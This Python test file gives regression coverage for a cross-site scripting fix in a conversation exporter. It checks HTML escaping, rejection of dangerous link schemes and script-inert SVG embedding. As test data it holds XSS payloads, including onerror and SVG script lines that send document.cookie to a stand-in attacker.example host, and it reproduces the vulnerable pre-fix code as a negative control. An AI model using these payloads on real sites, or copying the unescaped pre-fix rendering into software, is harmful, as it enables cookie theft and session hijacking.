"""
Regression coverage for PenPal #51 [HIGH, CWE-79]: conversation_exporter's
_markdown_to_html_basic() interpolated raw markdown/prose into HTML tags
with no escaping, so a message containing raw HTML (<img onerror=...>,
<script>, a javascript: link target) was emitted verbatim into the
exported HTML document -- executing the moment a developer opened it in
a browser or pasted it into a paste service that renders HTML.

Fix: prose (and inline-code/link-label text) is now HTML-escaped before
any markdown->tag conversion runs; javascript:/vbscript:/data: link
hrefs are rejected outright rather than rendered as a real <a href>.
"""
import pytest

from app.utils.conversation_exporter import _markdown_to_html_basic


class TestRawHtmlInProseIsEscaped:
    """The report's exact payload class: raw HTML tags in prose text."""

    def test_img_onerror_tag_is_escaped(self):
        html = _markdown_to_html_basic(
            'Click <img src=x onerror=fetch("https://attacker.example/?c="+document.cookie)> here.'
        )
        assert '<img src=x onerror=' not in html
        assert '&lt;img src=x onerror=' in html

    def test_script_tag_is_escaped(self):
        html = _markdown_to_html_basic('Hello <script>alert(document.cookie)</script> world.')
        assert '<script>' not in html
        assert '&lt;script&gt;' in html

    def test_event_handler_attribute_is_escaped(self):
        html = _markdown_to_html_basic('<a onmouseover="alert(1)">hover</a>')
        assert 'onmouseover="alert(1)"' not in html or '&lt;a onmouseover' in html
        assert '&lt;a ' in html


class TestDangerousLinkSchemesRejected:
    """javascript:/vbscript:/data: hrefs must never become a real <a href>."""

    def test_javascript_scheme_link_defused(self):
        html = _markdown_to_html_basic('[click me](javascript:alert(document.cookie))')
        assert 'href="javascript:' not in html
        assert 'click me' in html  # label preserved, just not clickable

    def test_vbscript_scheme_link_defused(self):
        html = _markdown_to_html_basic('[x](vbscript:msgbox(1))')
        assert 'href="vbscript:' not in html

    def test_data_scheme_link_defused(self):
        html = _markdown_to_html_basic('[x](data:text/html,<script>alert(1)</script>)')
        assert 'href="data:' not in html

    def test_legitimate_https_link_still_rendered(self):
        html = _markdown_to_html_basic('[docs](https://example.com/page)')
        assert '<a href="https://example.com/page"' in html
        assert 'rel="noopener noreferrer"' in html

    def test_legitimate_mailto_link_still_rendered(self):
        html = _markdown_to_html_basic('[email](mailto:a@example.com)')
        assert '<a href="mailto:a@example.com"' in html


class TestCodeBlocksStillRenderCorrectly:
    """The placeholder-extraction machinery must not break normal code rendering."""

    def test_fenced_code_block_preserved_and_escaped(self):
        html = _markdown_to_html_basic('```python\nprint("<script>x</script>")\n```')
        assert '<pre><code class="language-python">' in html
        assert '&lt;script&gt;' in html
        assert '\x00' not in html  # no leftover placeholder markers

    def test_inline_code_preserved_and_escaped(self):
        html = _markdown_to_html_basic('Use `<b>not bold</b>` here.')
        assert '<code>&lt;b&gt;not bold&lt;/b&gt;</code>' in html
        assert '\x00' not in html

    def test_no_leftover_placeholder_when_no_code(self):
        html = _markdown_to_html_basic('Just plain **bold** text.')
        assert '\x00' not in html


class TestNormalMarkdownStillWorks:
    """Baseline: legitimate markdown must still produce the expected tags."""

    def test_bold(self):
        assert '<strong>bold</strong>' in _markdown_to_html_basic('**bold**')

    def test_italic(self):
        assert '<em>italic</em>' in _markdown_to_html_basic('*italic*')

    def test_headers(self):
        html = _markdown_to_html_basic('# H1\n\n## H2\n\n### H3')
        assert '<h1>H1</h1>' in html
        assert '<h2>H2</h2>' in html
        assert '<h3>H3</h3>' in html

    def test_paragraphs(self):
        html = _markdown_to_html_basic('Line one.\n\nLine two.')
        assert '<p>Line one.</p>' in html
        assert '<p>Line two.</p>' in html


class TestNegativeControlPreFixBehavior:
    """
    Reproduces the pre-fix logic directly (rather than importing the old
    module state, which no longer exists) to prove the vulnerability was
    real and the test above is not tautological.
    """

    @staticmethod
    def _pre_fix_markdown_to_html_basic(markdown: str) -> str:
        import re
        html = markdown

        def convert_code_block(match):
            lang = match.group(1) or 'text'
            code = match.group(2)
            code = code.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
            return f'<pre><code class="language-{lang}">{code}</code></pre>'

        html = re.sub(r'```(\w+)?\n(.*?)```', convert_code_block, html, flags=re.DOTALL)
        html = re.sub(r'`([^`]+)`', r'<code>\1</code>', html)
        html = re.sub(r'\*\*([^*]+)\*\*', r'<strong>\1</strong>', html)
        html = re.sub(r'\*([^*]+)\*', r'<em>\1</em>', html)
        html = re.sub(r'\[([^\]]+)\]\(([^)]+)\)', r'<a href="\2">\1</a>', html)
        html = re.sub(r'^### (.*?)$', r'<h3>\1</h3>', html, flags=re.MULTILINE)
        html = re.sub(r'^## (.*?)$', r'<h2>\1</h2>', html, flags=re.MULTILINE)
        html = re.sub(r'^# (.*?)$', r'<h1>\1</h1>', html, flags=re.MULTILINE)
        paragraphs = html.split('\n\n')
        html = ''.join(
            f'<p>{p.replace(chr(10), "<br>")}</p>\n'
            if p.strip() and not p.strip().startswith('<')
            else p + '\n'
            for p in paragraphs
        )
        return html

    def test_prefix_logic_lets_img_onerror_through_unescaped(self):
        html = self._pre_fix_markdown_to_html_basic(
            'Click <img src=x onerror=fetch("https://attacker.example/?c="+document.cookie)> here.'
        )
        assert '<img src=x onerror=' in html  # proves the exploit fired pre-fix

    def test_prefix_logic_renders_javascript_link_live(self):
        html = self._pre_fix_markdown_to_html_basic('[click me](javascript:alert%281%29)')
        assert 'href="javascript:alert%281%29"' in html  # proves the exploit fired pre-fix


# ---------------------------------------------------------------------------
# PenPal #116 [CWE-79]: rendered-SVG diagram embedding must not inline the SVG
# ---------------------------------------------------------------------------
import base64

try:
    from app.utils.conversation_exporter import (
        _embed_diagrams_in_html,
        _viz_fingerprint,
    )
    _HAS_EMBED = True
except ImportError:  # helpers not present yet — skip rather than error-collect
    _HAS_EMBED = False


_MALICIOUS_SVG = (
    b'<svg xmlns="http://www.w3.org/2000/svg">'
    b'<script>fetch("https://attacker.example/?c="+document.cookie)</script>'
    b'<image href="x" onerror="alert(document.cookie)"/>'
    b'</svg>'
)


def _make_diagram_map(svg_bytes: bytes, viz_type: str = "mermaid",
                      diagram_type: str = "svg"):
    """Build the (content, diagram_by_hash) pair _embed_diagrams_in_html
    consumes. NOTE: the function runs _markdown_to_html_basic(content) FIRST
    (which HTML-escapes code-fence bodies since #51) and only then matches
    the viz pattern + fingerprints group(2). So content must be a raw
    markdown fence, and the fingerprint must key on the source EXACTLY as it
    survives conversion. We use a special-char-free source so the pre- and
    post-escape forms are identical and the fingerprint matches."""
    source_code = "graph LR A B C"
    fp = _viz_fingerprint(source_code)
    data_uri = f"data:image/svg+xml;base64,{base64.b64encode(svg_bytes).decode()}"
    content = f"```{viz_type}\n{source_code}\n```"
    return content, {fp: {"dataUri": data_uri, "type": diagram_type,
                          "width": 600, "height": 400}}


@pytest.mark.skipif(not _HAS_EMBED, reason="_embed_diagrams_in_html not available")
class TestRenderedSvgNotInlined:
    """A rendered SVG (from a model-authored diagram spec) must never be
    inlined into the exported DOM, where its <script>/on* handlers would
    execute. It must be embedded via <img src=data:...>, which browsers
    render script-inert."""

    def test_malicious_svg_not_inlined_as_raw_markup(self):
        content, dmap = _make_diagram_map(_MALICIOUS_SVG)
        html = _embed_diagrams_in_html(content, dmap)
        assert "<script>" not in html
        assert 'onerror="alert' not in html
        assert "attacker.example" not in html

    def test_svg_embedded_via_img_data_uri(self):
        content, dmap = _make_diagram_map(_MALICIOUS_SVG)
        html = _embed_diagrams_in_html(content, dmap)
        assert '<img src="data:image/svg+xml;base64,' in html

    def test_benign_svg_still_rendered_via_img(self):
        benign = (b'<svg xmlns="http://www.w3.org/2000/svg">'
                  b'<rect width="10" height="10"/></svg>')
        content, dmap = _make_diagram_map(benign)
        html = _embed_diagrams_in_html(content, dmap)
        assert '<img src="data:image/svg+xml;base64,' in html
        assert '<code class="language-mermaid">' not in html


class TestNegativeControlInlineSvgPreFix:
    """Negative control: the pre-fix inline-SVG branch emitted the decoded
    SVG verbatim into the DOM, so a <script> in it WOULD reach the exported
    document. Proves the tests above are non-vacuous."""

    @staticmethod
    def _pre_fix_embed(data_uri: str, diagram_type: str) -> str:
        if diagram_type == "svg" and "," in data_uri:
            try:
                svg_content = base64.b64decode(data_uri.split(",")[1]).decode("utf-8")
                return f'<div class="visualization">{svg_content}</div>'
            except Exception:
                pass
        return f'<div class="visualization"><img src="{data_uri}"/></div>'

    def test_pre_fix_inlines_executable_svg(self):
        data_uri = ("data:image/svg+xml;base64,"
                    + base64.b64encode(_MALICIOUS_SVG).decode())
        html = self._pre_fix_embed(data_uri, "svg")
        assert "<script>" in html
        assert "attacker.example" in html